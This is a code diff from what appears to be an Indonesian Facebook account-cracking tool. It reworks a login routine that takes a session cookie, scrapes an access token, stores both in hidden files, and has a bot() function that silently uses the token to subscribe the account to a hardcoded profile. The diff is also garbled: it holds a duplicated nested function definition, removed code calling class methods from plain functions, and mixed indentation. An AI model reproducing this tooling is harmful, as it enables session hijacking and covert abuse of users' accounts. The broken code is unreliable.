@@ -186,6 +186,7 @@ def login123():
 		back()
 		
 def login():
+	def login():
 	try:
 		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
@@ -196,51 +197,37 @@ def login():
 			sy3 = json.loads(sy.text)['id']
 			menu(sy2,sy3)
 		except KeyError:
-			login123()
+			login_lagi334()
 		except requests.exceptions.ConnectionError:
-			li = ' [+] Problem Internet Connection, Check And Try Again'
+			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
 			lo = mark(li, style='red')
 			sol().print(lo, style='cyan')
 			exit()
 	except IOError:
-		login123()
-		
+		login_lagi334()
 def login_lagi334():
 	try:
-		cetak(nel('Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=90,style=f"bold white"))
-		your_cookies = input(' [+] Masukan Cookie : ')
-		with requests.Session() as r:
-			try:
-				sleep(3);self.___login___()
-            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies={"cookie": cok}).text
-            if 'href="/zero/optin/write/' in str(link):
-                Console(width=70).print(Panel(f'{P2}akun facebook anda sedang menggunakan mode free',style=f"bold white",padding=(0,9)))
-                Console(width=70).print(Panel(f'{P2}mohon tunggu sebentar system sedang mengubah cookie ke mode data',style=f"bold white",padding=(0,2)))
-                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "")
-                gett = self.ses.get(f"{self.url}/zero/optin/write/{urll}", cookies={"cookie": cok}).text
-                poss = par(gett, "html.parser").find("form",{"method":"post"})["action"].replace("amp;", "")
-                date = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(gett)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
-                self.ses.post(f"{self.url}{poss}", data = date, cookies = {"cookie": cok}).text
-                self.__UbahNgaranKontol__({"cookie": cok})
-                console.print(f' {P2}[{H2}✓{P2}] proses mengubah ke mode data telah selesai.\n {P2}[{H2}+{P2}] silahkan masukan ulang cookie nya dengan mengetik python run.py')
-                sleep(3);sys.exit()
-            elif 'href="/x/checkpoint/' in str(link):
-                console.print(f' {P2}[{M2}!{P2}] opshh cookie anda chekcpoint')
-                sleep(3);self.___login___()
-            elif 'href="/r.php' in str(link):
-                console.print(f' {P2}[{M2}!{P2}] cookie yang anda masukan invalid')
-                sleep(3);self.___login___()
-            else:
-                self.anim()
-                self.__UbahNgaranKontol__({"cookie": cok})
-                nama = re.findall("\<title\>(.*?)<\/title\>", link)[0]
-                user = re.search("c_user=(\d+)", str(cok)).group(1)
-                open('data/cookie.json', 'w').write(cok);open('data/token.json', 'w').write(f"{nama}|{user}")
-                console.print(f' {P2}[{H2}+{P2}] selamat datang {H2}{nama} {P2}mohon gunakan tools dengan bijak');self.ikuti({"cookie": cok});self.datas(nama, cok)
-                sleep(5);self.menu()
-        except requests.ConnectionError as e:
-            Console(width=70).print(Panel(f'''{M2}{str(e).title()}''',style=f"bold white",padding=(0,4)))
-            sleep(3);sys.exit()
+		os.system('clear')
+		banner()
+		cetak(nel('\t©©© Saran Ektensi : [green]Cookiedough[white] ©©©'))
+		asu = random.choice([m,k,h,b,u])
+		cookie=input(f'  [{h}•{x}] Masukkan Cookies :{asu} ')
+		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
+		find_token = re.search("(EAAG\w+)", data.text)
+		ken=open(".token.txt", "w").write(find_token.group(1));bot()
+		cok=open(".cok.txt", "w").write(cookie)
+		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL.........Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
+		exit()
+	except Exception as e:
+		os.system("rm -f .token.txt")
+		os.system("rm -f .cok.txt")
+		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
+		exit()
+def bot():
+	try:
+		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
+	except:
+		pass
 #------------------[ BAGIAN-MENU ]----------------#
 def menu(my_name,my_id):
 	try:
